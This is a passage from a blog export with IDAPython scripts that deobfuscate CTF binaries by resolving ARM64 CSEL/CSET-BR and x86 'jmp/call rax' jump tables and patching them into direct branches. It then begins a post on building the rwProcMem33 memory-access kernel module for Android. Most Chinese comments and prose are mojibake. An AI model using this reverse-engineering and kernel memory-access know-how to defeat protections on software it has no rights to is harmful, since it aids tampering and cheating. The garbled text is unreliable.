== -1 or CSEL_op3_val == -1) and temp_addr > text_seg.start_ea: if CSEL_op2 == \"XZR\": # å¦‚æœå¯„å­˜å™¨çš„å€¼æ˜¯ XZR, è¯´æ˜è¯¥å€¼ä¸º 0 CSEL_op2_val = 0 if CSEL_op3 == \"XZR\": CSEL_op3_val = 0 if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] == CSEL_op2[ 1::] and CSEL_op2_val == -1: # å¯„å­˜å™¨ X11 å’Œ W11 æ˜¯åŒä¸€ä¸ªå¯„å­˜å™¨ CSEL_op2_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_operand(temp_addr, 0)[1::] == CSEL_op3[1::] and CSEL_op3_val == -1: CSEL_op3_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # print(CSEL_op2_val, CSEL_op3_val, hex(current_addr)) assert CSEL_op2_val != -1 and CSEL_op3_val != -1 temp_addr = BR_addr jump_array_reg = \"\" # å­˜è´®è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° jump_array_addr = -1 # è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½® add_reg = [] # åŠ åˆ°è·³è½¬è¡¨çš„å€¼æ‰€åœ¨çš„å¯„å­˜å™¨ add_val = -1 # åŠ åˆ°è·³è½¬è¡¨çš„å€¼ while temp_addr > CSEL_addr: # ä»åå¾€å‰æ‰¾ï¼Œä»¥ BR æ‰€åœ¨çš„åœ°å€å¼€å§‹ï¼ŒCSEL æ‰€åœ¨çš„åœ°å€ç»“æŸï¼ŒåŒ¹é…å¿…è¦çš„å¯„å­˜å™¨åç§°å’Œå€¼ # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": jump_array_reg = idc.print_operand(temp_addr, 1)[1:-1].split(',')[0] # è·å–å­˜å‚¨è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # å¦‚æœåœ¨ CSEL-BR é—´çš„æŒ‡ä»¤ä¸­æ²¡æ‰¾åˆ°è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½®ï¼Œåˆ™å‘ä¸Šå¯»æ‰¾ if jump_array_addr == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP æŒ‡ä»¤ï¼Œè¿˜éœ€è¦åŠ ä¸Šå¦ä¸€éƒ¨åˆ† if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) if add_val == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg and idc.print_operand(temp_addr, 0)[0] == 'X': add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.prev_head(temp_addr) # è®¡ç®—å‡ºåˆ†æ”¯è·³è½¬çš„ä¸¤ä¸ªä½ç½® branch_a = (ida_bytes.get_qword(jump_array_addr + CSEL_op2_val) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + CSEL_op3_val) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT æœ‰ç¬¦å·å¤§äºç­‰äº vs æœ‰ç¬¦å·å°äº # EQ&lt;->NE ç»“æœç›¸ç­‰ vs ç»“æœä¸ç›¸ç­‰ # CC&lt;->CS æ— ç¬¦å·å°äº vs æ— ç¬¦å·å¤§äºç­‰äº # HI&lt;->LS æ— ç¬¦å·å¤§äº vs æ— ç¬¦å·å°äºç­‰äº # if CSEL_cond == \"GE\":# æ„é€  B.LT è·³è½¬ logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘ä¸å–å code = f\"B.&#123;CSEL_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘å–å code = f\"B.&#123;logic_rev[CSEL_cond]&#125; #&#123;hex(branch_b)&#125;\" #print(hex(current_addr), hex(add_val), CSEL_op2_val, CSEL_op3_val, hex(jump_array_addr), code) # ä¿®å¤ BR è·³è½¬ if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSEL-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSEL-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") # å¤„ç† CSET-BR ç»“æ„ elif idc.print_insn_mnem(current_addr) == \"CSET\": CSET_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSET_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(15): # å‘ä¸‹æœå¯» 15 æ¡æŒ‡ä»¤ï¼Œå¯»æ‰¾æ˜¯å¦æœ‰ BR æŒ‡ä»¤ if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break elif idc.print_insn_mnem(temp_addr) == \"CSEL\": break elif idc.print_insn_mnem(temp_addr) == \"RET\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # åŒ¹é…åˆ°äº† CSET-BR ç»“æ„çš„æ±‡ç¼–ï¼Œéœ€è¦å»é™¤ # å½¢å¦‚ CSET W23, NE, è·å– CSET åçš„æ“ä½œæ•° op1, ä»¥åŠæ¡ä»¶ç  cond CSET_op1 = idc.print_operand(CSET_addr, 0) CSET_op1_val = -1 CSET_cond = idc.print_operand(CSET_addr, 1) temp_addr = BR_addr jump_array_reg = \"\" # å­˜è´®è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° jump_array_addr = 0 # è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½® add_reg = [] # åŠ åˆ°è·³è½¬è¡¨çš„å€¼æ‰€åœ¨çš„å¯„å­˜å™¨ add_val = 0 # åŠ åˆ°è·³è½¬è¡¨çš„å€¼ Lshift_val = -1 while temp_addr > CSET_addr: # ä»åå¾€å‰æ‰¾ï¼Œä»¥ BR æ‰€åœ¨çš„åœ°å€å¼€å§‹ï¼ŒCSET æ‰€åœ¨çš„åœ°å€ç»“æŸï¼ŒåŒ¹é…å¿…è¦çš„å¯„å­˜å™¨åç§°å’Œå€¼ # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOVK\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": LDR_temp = idc.print_operand(temp_addr, 1)[1:-1].split(',') jump_array_reg = LDR_temp[0] # è·å–å­˜å‚¨è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° if len(LDR_temp) == 3: Lshift_val = int(LDR_temp[2][-1:]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LSL\": if idc.print_operand(temp_addr, 0)[1::] == CSET_op1[1::]: Lshift_val = idc.get_operand_value(temp_addr, 2) temp_addr = idc.prev_head(temp_addr) # å¦‚æœåœ¨ CSET-BR é—´çš„æŒ‡ä»¤ä¸­æ²¡æ‰¾åˆ°è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½®ï¼Œåˆ™å‘ä¸Šå¯»æ‰¾ if jump_array_addr == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP æŒ‡ä»¤ï¼Œè¿˜éœ€è¦åŠ ä¸Šå¦ä¸€éƒ¨åˆ† if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) # å‘ä¸Šå¯»æ‰¾åŠ åˆ°è·³è½¬è¡¨çš„å€¼ if add_val == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"MOVK\": # å½¢å¦‚ MOV W9, #0x76BC;MOVK W9, #0x4C48,LSL#16; çš„å½¢å¼ if idc.print_operand(temp_addr, 0)[1::] in add_reg: # print(hex(add_val)) add_val = (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) # print(hex(add_val)) while temp_addr > text_seg.start_ea: if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) # print(hex(add_val)) break temp_addr = idc.prev_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(current_addr)) # è®¡ç®—å‡ºåˆ†æ”¯è·³è½¬çš„ä¸¤ä¸ªä½ç½® branch_a = (ida_bytes.get_qword(jump_array_addr + (1 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + (0 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT æœ‰ç¬¦å·å¤§äºç­‰äº vs æœ‰ç¬¦å·å°äº # EQ&lt;->NE ç»“æœç›¸ç­‰ vs ç»“æœä¸ç›¸ç­‰ # CC&lt;->CS æ— ç¬¦å·å°äº vs æ— ç¬¦å·å¤§äºç­‰äº # HI&lt;->LS æ— ç¬¦å·å¤§äº vs æ— ç¬¦å·å°äºç­‰äº # if CSEL_cond == \"GE\":# æ„é€  B.LT è·³è½¬ logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘ä¸å–å code = f\"B.&#123;CSET_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘å–å code = f\"B.&#123;logic_rev[CSET_cond]&#125; #&#123;hex(branch_b)&#125;\" # print(hex(current_addr),add_reg,hex(add_val),CSET_op1,CSET_op1_val,jump_array_reg,hex(jump_array_addr),Lshift_val,code) # ä¿®å¤ BR è·³è½¬ if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSET-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSET-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") current_addr = idc.next_head(current_addr)for addr in nop_addr_array_after_finish: patch_nop(addr, addr + idc.get_item_size(addr)) x86_64 æ¶æ„çš„ jmp rax ç±»å‹å¯„å­˜å™¨è·³è½¬ ä¾‹é¢˜ç‚¹è¿™é‡Œä¸‹è½½ ACTF-obfuse import ida_segmentimport idautilsimport idcimport ida_bytesimport binasciiimport refrom keystone import *def patch_nop(addr, endaddr): while addr &lt; endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1# è·å– text æ®µçš„èµ·å§‹åœ°å€text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea# start, end = 0x41143D,0x41145F# æµ‹è¯• call rax#start, end = 0x411489,0x411498# æµ‹è¯• jmp rax case1# start, end = 0x411568, 0x411575 # æµ‹è¯• jmp rax case2#start, end = 0x410EC0,0x412670# å»é™¤ check å‡½æ•°çš„æ··æ·†#start, end = 0x410EC0,0x412670# åœ¨ check ä¸­æµ‹è¯• jmp rax case2current_addr = startcall_table = 0x67F1A0 # call rax è·³è½¬è¡¨åœ°å€'''è¿™æ˜¯ä¸€ä¸ªcall raxåŸºæœ¬å— éœ€è¦å»é™¤mov rax, [rax+14E8h];call raxmov rax, [rax+14E8h]movzx edi, byte ptr [rbp+var_50+6]mov edx, offset dword_674040mov esi, 1lea rcx, [rbp+var_120]mov r8d, 2AE8944Ahcall raxå¤„ç†ååº”ä¸ºå¦‚ä¸‹å½¢å¼movzx edi, byte ptr [rbp+var_50+6]mov edx, offset dword_674040mov esi, 1lea rcx, [rbp+var_120]mov r8d, 2AE8944Ahcall sub_xxxxxx'''while current_addr &lt;= end: #print(hex(current_addr)) # å¤„ç† call rax ç»“æ„ if idc.print_insn_mnem(current_addr) == \"call\" and idc.print_operand(current_addr, 0) == \"rax\": # print(\"call rax\") call_rax_addr = current_addr mov_rax_xxxh_addr = -1 call_func_addr = -1 # è·å–éœ€è¦è·³è½¬çš„åœ°å€ temp_addr = call_rax_addr count = 1 while temp_addr >= start and count&lt;30: if idc.print_insn_mnem(temp_addr) == \"mov\" and idc.print_operand(temp_addr, 0) == \"rax\" and \"rax\" in idc.print_operand( temp_addr, 1): mov_rax_xxxh_addr = temp_addr # è·å– [rax+14E8h] ä¸­çš„ 14E8 åå…­è¿›åˆ¶å­—ç¬¦ä¸² tmp_call_table_offset_re_result = re.findall(r'\\[\\w+\\+([\\da-fA-F]+)', idc.print_operand(temp_addr, 1)) if tmp_call_table_offset_re_result: tmp = tmp_call_table_offset_re_result[0] #print(tmp) if len(tmp)%2==1: if tmp.startswith('0'): tmp = tmp[1::] else: tmp = '0'+tmp call_table_offset = binascii.a2b_hex(tmp) else: break call_table_offset = int.from_bytes(call_table_offset, 'big') call_func_addr = ida_bytes.get_dword(call_table + call_table_offset) break temp_addr = idc.prev_head(temp_addr) count = count+1 # print(hex(call_func_addr)) if call_rax_addr == -1 or mov_rax_xxxh_addr == -1 or call_func_addr == -1: current_addr = idc.next_head(current_addr) continue # å‡†å¤‡ patch movRAX_callRAX_patch = b'' # print(hex(idc.next_head(mov_rax_xxxh_addr)),hex(call_rax_addr)) ea = idc.next_head(mov_rax_xxxh_addr) while ea &lt; call_rax_addr: size = idc.next_head(ea) - ea #print(ida_bytes.get_bytes(ea, size)) movRAX_callRAX_patch += ida_bytes.get_bytes(ea, size) ea = idc.next_head(ea) # è®¡ç®—è·³è½¬åˆ°çš„åœ°å€ if call_func_addr != -1: ks = Ks(KS_ARCH_X86, KS_MODE_64) code = f\"call &#123;call_func_addr&#125;\" patch_call_rax_byte, count = ks.asm(code, addr=(mov_rax_xxxh_addr + len(movRAX_callRAX_patch))) #print(call_func_addr, code, patch_call_rax_byte) else: continue movRAX_callRAX_patch += bytes(patch_call_rax_byte) # print(movRAX_callRAX_patch) ida_bytes.patch_bytes(mov_rax_xxxh_addr, b'\\x90' * (idc.next_head(call_rax_addr) - mov_rax_xxxh_addr)) ida_bytes.patch_bytes(mov_rax_xxxh_addr, movRAX_callRAX_patch) print(f\"fix call rax at &#123;hex(call_rax_addr)&#125;\") # å¤„ç† jmp rax ç»“æ„ ''' è€ƒè™‘ä¸¤ç§æƒ…å†µ æ­¤æ—¶éœ€è¦å…ˆè·å–rcx ä¸€: mov rax, cs:qword_67CA28 mov ecx, 0ADAE163Ch add rax, rcx jmp rax äºŒ: mov rax, cs:qword_67CA30 add rax, 5C65CCC7h jmp rax ''' if idc.print_insn_mnem(current_addr) == \"jmp\" and idc.print_operand(current_addr, 0) == \"rax\": # print(\"jmp rax\") mov_rax_qword_xxx_addr = -1 mov_reg_xxx_addr = -1 add_rax_xxx_addr = -1 jmp_rax_addr = current_addr add_num1 = -1 add_num2 = -1 # è·å–åŠ ä¸Šçš„ç¬¬ä¸€ä¸ªæ•° temp_addr = jmp_rax_addr count = 1 while temp_addr >= start and count&lt;30: if idc.print_insn_mnem(temp_addr) == \"mov\" and idc.print_operand(temp_addr, 0) == \"rax\": mov_rax_qword_xxx_addr = temp_addr tmp = re.findall(r'cs:qword_([0-9A-Fa-f]+)', idc.print_operand(temp_addr, 1)) if tmp: add_num1_addr = tmp[0] add_num1_addr = int.from_bytes(binascii.a2b_hex(add_num1_addr), 'big') add_num1 = ida_bytes.get_qword(add_num1_addr) else: break #print(add_num1_addr) break temp_addr = idc.prev_head(temp_addr) count = count+1 # è·å–åŠ ä¸Šçš„ç¬¬äºŒä¸ªæ•° temp_addr = jmp_rax_addr count = 1 while temp_addr >= start and count&lt;30: if idc.print_insn_mnem(temp_addr) == \"add\" and idc.print_operand(temp_addr, 0) == \"rax\": add_rax_xxx_addr = temp_addr # å¦‚æœç›´æ¥åŠ ä¸Šä¸€ä¸ªæ•° if not idc.print_operand(temp_addr, 1).endswith('x'): add_num2 = idc.print_operand(temp_addr, 1) # å¦‚æœè¿™ä¸ªæ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¾‹å¦‚ ecx èµ‹å€¼çš„ else: tmp_add_num2_reg = idc.print_operand(temp_addr, 1) temp_addr_2 = temp_addr count2 = 1 while temp_addr_2 >= start and count2&lt;30: # print(idc.print_insn_mnem(temp_addr),idc.print_operand(temp_addr, 0)[1::],tmp_add_num2_reg[1::]) if idc.print_insn_mnem(temp_addr_2) == \"mov\" and idc.print_operand(temp_addr_2, 0)[ 1::] == tmp_add_num2_reg[1::]: add_num2 = idc.print_operand(temp_addr_2, 1) mov_reg_xxx_addr = temp_addr_2 break temp_addr_2 = idc.prev_head(temp_addr_2) count2=count2+1 try: add_num2 = add_num2.strip('h') if len(add_num2) % 2 == 1: if add_num2.startswith('0'): add_num2 = add_num2[1::] else: add_num2 = '0' + add_num2 add_num2 = int.from_bytes(binascii.a2b_hex(add_num2), 'big') #print(add_num2) except: break break temp_addr = idc.prev_head(temp_addr) count = count+1 if add_num1 == -1 or add_num2 == -1 or mov_rax_qword_xxx_addr == -1 or add_rax_xxx_addr == -1 or jmp_rax_addr == -1: #print(add_num1,add_num2,mov_rax_qword_xxx_addr,add_rax_xxx_addr,jmp_rax_addr) current_addr = idc.next_head(current_addr) continue # å‡†å¤‡ patch movRAX_jmpRAX_patch = b'' #print(hex(idc.next_head(mov_rax_xxxh_addr)), hex(call_rax_addr)) should_pass_addr = [mov_rax_qword_xxx_addr, mov_reg_xxx_addr, add_rax_xxx_addr, jmp_rax_addr] ea = mov_rax_qword_xxx_addr while ea &lt; jmp_rax_addr: if ea not in should_pass_addr: size = idc.next_head(ea) - ea # print(ida_bytes.get_bytes(ea, size)) movRAX_jmpRAX_patch += ida_bytes.get_bytes(ea, size) ea = idc.next_head(ea) # è®¡ç®—è·³è½¬åˆ°çš„åœ°å€ #print(hex(add_num1), add_num2) jmp_addr = (add_num1 + add_num2) &amp; 0xffffffff ks = Ks(KS_ARCH_X86, KS_MODE_64) code = f\"jmp &#123;jmp_addr&#125;\" patch_call_rax_byte, count = ks.asm(code, addr=(mov_rax_qword_xxx_addr + len(movRAX_jmpRAX_patch))) # print(call_func_addr, code, patch_call_rax_byte) movRAX_jmpRAX_patch += bytes(patch_call_rax_byte) # print(movRAX_callRAX_patch) ida_bytes.patch_bytes(mov_rax_qword_xxx_addr, b'\\x90' * (idc.next_head(jmp_rax_addr) - mov_rax_qword_xxx_addr)) ida_bytes.patch_bytes(mov_rax_qword_xxx_addr, movRAX_jmpRAX_patch) print(f\"fix jmp rax at &#123;hex(jmp_rax_addr)&#125;\") current_addr = idc.next_head(current_addr)#patch_nop(0x410FB3,0x41142C) # å‚è€ƒèµ„æ–™ ida python ä½¿ç”¨ idapython ç¬”è®°å­¦ä¹  åœ¨ PyCharm ä¸­å†™ IDAPython è„šæœ¬","categories":[],"tags":[{"name":"idapython","slug":"idapython","permalink":"https://oacia.dev/tags/idapython/"}]},{"title":"å°†rwProcMem33ç¼–è¯‘è¿›å®‰å“å†…æ ¸","slug":"rwProcMem33-usage","date":"2023-08-10T13:41:17.000Z","updated":"2024-06-20T10:00:21.000Z","comments":true,"path":"rwProcMem33-usage/","link":"","permalink":"https://oacia.dev/rwProcMem33-usage/","excerpt":"","text":"ä¸ºäº†åšå‡ºè…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›åˆèµ›çš„è¿™é“å®‰å“é¢˜ï¼Œå¼€å§‹å­¦ä¹  rwProcMem33 çš„ä½¿ç”¨æ¥æ‰“ç¡¬ä»¶æ–­ç‚¹äº† åœ¨ juice4fun å¸ˆå‚…åšè…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›åˆèµ›çš„å®‰å“é¢˜çš„ writeup æ—¶ï¼Œä½¿ç”¨äº† rwProcMem33 æ¥å¯¹å®‰å“æ‰‹æœºæ‰“ä¸‹ç¡¬ä»¶æ–­ç‚¹åˆ†æåè°ƒè¯•ï¼Œæˆ‘ä¹Ÿå¯¹åœ¨å®‰å“æ‰‹æœºä¸­æ‰“ç¡¬ä»¶æ–­ç‚¹çš„å·¥å…·å¾ˆæ„Ÿå…´è¶£ï¼Œæ‰€ä»¥å°±å­¦ä¹ ä¸€ä¸‹ç¼–è¯‘å’Œä½¿ç”¨çš„æ–¹æ³•å•¦ è¦æƒ³ä½¿ç”¨ rwProcMem33, ç¼–è¯‘ç¯å¢ƒ (å³ AOSP å®‰å“å†…æ ¸æºç ç¯å¢ƒ) çš„æ­å»ºè¿‡ç¨‹æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå› ä¸ºæœ€ç»ˆå†…æ ¸æ¨¡å—æ˜¯è¿è¡Œåœ¨å®‰å“æ‰‹æœºçš„ linux å†…æ ¸ä¸­ï¼Œè€Œéè™šæ‹Ÿæœºçš„ linux å†…æ ¸ä¸­ï¼Œæ‰€ä»¥å†…æ ¸æºç æ˜¯æœ‰å¿…è¦ä¸‹è½½çš„ æ‰€ä»¥è¿™ç¯‡æ–‡ç« ä¸ä»…æ˜¯ç¡¬ä»¶æ–­ç‚¹å·¥å…·çš„ç¼–è¯‘å’Œä½¿ç”¨ç¬”è®°ï¼Œä¹Ÿæ˜¯å®‰å“å†…æ ¸çš„ç¼–è¯‘ç¬”è®°ï¼Œç”¨æ¥è®°å½•æˆ‘åœ¨ç¼–è¯‘å†…æ ¸çš„è¿‡ç¨‹ä¸­é‡åˆ°çš„å›°éš¾ï¼Œä»¥åŠå¦‚ä½•å…‹æœçš„ ä¸ºäº†æ›´å¿«çš„ä¸‹è½½é€Ÿåº¦ï¼Œå¯ä»¥é€‰æ‹©é…ç½®ä»£ç†ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨åˆ‡æ¢ä¸‹è½½æºï¼Œåªè¦ä¸å‡ºç°ç½‘ç»œé—®é¢˜å¯¼è‡´ä¸‹è½½å¤±è´¥å°±è¡Œ docker çš„ä½¿ç”¨å®Œå…¨æ˜¯å› ä¸ºæˆ‘çš„è™šæ‹Ÿæœº shell ç¯å¢ƒå´©æºƒï¼Œä»è€Œå¯¼è‡´æ— æ³•ç¼–è¯‘ï¼Œå¦‚æœå¯¹è‡ªå·±è™šæ‹Ÿæœºçš„ shell ç¯å¢ƒè¶³å¤Ÿè‡ªä¿¡ï¼Œä¸ä½¿ç”¨ docker ä¹Ÿæ˜¯å¯ä»¥çš„ # ç¼–è¯‘ç¯å¢ƒæ­å»º # è™šæ‹Ÿæœºé…ç½® æˆ‘ä½¿ç”¨çš„è™šæ‹Ÿæœºä¸º Ubuntu22.04 , è™šæ‹Ÿæœºçš„å‚è€ƒé…ç½®å¦‚ä¸‹ # ä¸ºè™šæ‹Ÿæœºé…ç½®ä»£ç† # æŸ¥çœ‹è™šæ‹Ÿæœºä»£ç†åœ°å€ æ‰“å¼€ clash for windows , å¹¶æ‰“å¼€ Allow LAN çš„å¼€å…³ï¼Œéšåç‚¹å‡» network interfaces è¯·æ³¨æ„æˆ‘çš„è™šæ‹Ÿæœºä½¿ç”¨çš„ç½‘ç»œè¿æ¥æ–¹å¼ä¸º NAT æ¨¡å¼ï¼Œæ‰€ä»¥éœ€è¦å…³æ³¨ VMnet8 çš„åœ°å€ï¼Œæ‰€ä»¥å¯¹äºè¯¥è™šæ‹Ÿæœºï¼Œä»£ç†åœ°å€ä¸º 192.168.27.1 , ç«¯å£å°±æ˜¯ clash ä¸­ Port é€‰é¡¹æ‰€æ˜¾ç¤ºçš„ç«¯å£ # å¯ç”¨è™šæ‹Ÿæœºä»£ç† ä¾æ¬¡ç‚¹å‡»å¦‚ä¸‹é€‰é¡¹è¿›å…¥ä»£ç†é…ç½® è¾“å…¥ä»£ç†åœ°å€ä¿å­˜å³å¯ # é…ç½® docker ubuntu é•œåƒ æœ¬äººå› ä¸ºä¸å°å¿ƒè¿è¡Œäº†ä¸€ä¸ªå‘½ä»¤ source _setup_env.sh , å¯¼è‡´è™šæ‹Ÿæœºçš„ shell ç¯å¢ƒæ•´ä¸ªå´©æ‰äº†ï¼Œ build.sh ä¹Ÿå±¡å±¡è¿è¡Œå¤±è´¥ï¼Œçœ‹äº†çœ¼ _setup_env.sh æˆ‘çœŸæ˜¯åªèƒ½è‹¦æ¶©çš„ç¬‘â€¦ æ‰€ä»¥ä¸å¾—ä¸ç”¨ docker äº†ï¼Œä¸è¿‡ç”¨ä¸‹æ¥å‘ç°ç«Ÿç„¶æ„å¤–çš„å¥½ç”¨ # å®‰è£… docker sudo apt install docker.io# docker pull ä»£ç†é…ç½® sudo mkdir -p /etc/systemd/system/docker.service.dsudo gedit /etc/systemd/system/docker.service.d/proxy.confè¾“å…¥ä»¥ä¸‹ä»£ç†æœåŠ¡å™¨å†…å®¹ [Service]Environment=\"HTTP_PROXY=http://192.168.27.1:7890/\"Environment=\"HTTPS_PROXY=http://192.168.27.1:7890/\"Environment=\"NO_PROXY=localhost,127.0.0.1\"# åˆ·æ–°é…ç½®å¹¶é‡å¯ docker æœåŠ¡ sudo systemctl daemon-reloadsudo systemctl restart docker# docker é•œåƒä»£ç†é…ç½® sudo mkdir -p ~/.docker/sudo gedit ~/.docker/config.jsonè¾“å…¥ä»¥ä¸‹å†…å®¹ &#123; \"proxies\": &#123; \"default\": &#123; \"httpProxy\": \"http://192.168.27.1:7890/\", \"httpsProxy\": \"http://192.168.27.1:7890/\", \"noProxy\": \"localhost,127.0.0.1\" &#125; &#125;&#125;# ä¸‹è½½ Ubuntu é•œåƒ docker pull ubuntu# 